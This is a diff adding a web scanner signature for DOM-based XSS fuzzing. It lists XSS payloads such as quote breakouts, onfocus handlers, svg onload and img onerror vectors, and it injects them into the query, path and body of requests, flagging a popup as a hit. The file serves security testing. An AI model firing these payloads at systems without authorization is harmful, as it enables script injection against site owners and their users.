@@ -1,0 +1,47 @@
+# info to search signature
+id: fuzz-DOM-XSS
+type: fuzz
+info:
+  name: DOM Based XSS
+  risk: High
+
+# origin: gonna come from Burp
+variables:
+    - prefix : |  
+        #
+payloads:
+
+    - javascript:(prompt)(1)
+    - \'(prompt)(1)-\'
+    - \"-(prompt)(1)-\"
+    - \'}(prompt)(1);{\'
+    - \"}(prompt)(1)%0A{\"
+    - (prompt)(1)//
+    - \';-(prompt)(1)//
+    - \\'-(prompt)(1)//
+    - \\\"-(prompt)(1)//
+    - \";-(prompt)(1)//
+    - \*/;(prompt)(1);/*
+    - \'autofocus/onfocus=(prompt)(1)//
+    - \"autofocus/onfocus=(prompt)(1)//
+    - </script><svg/onload=(prompt)()>
+    - <img src=1 onerror=(prompt)(1)>
+    - /\"><svg/onload=(prompt)(1)>
+    - <something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">(prompt)(1)</something:script>
+      
+    
+requests:
+  #- method: GET
+  - engine: chrome
+    redirect: true
+    generators:
+      #Change exist content type or adding new one
+      #- Query("[[.original]]{{.payload}}")
+      - Query("{{.payload}}")
+      - Path("[[.original]]{{.payload}}")
+      - Path("[[.original]]{{.prefix}}{{.payload}}", "last")
+      - Body ("{{.payload}}", "*")     
+    detections:
+      - >-
+        HasPopUp()
+        
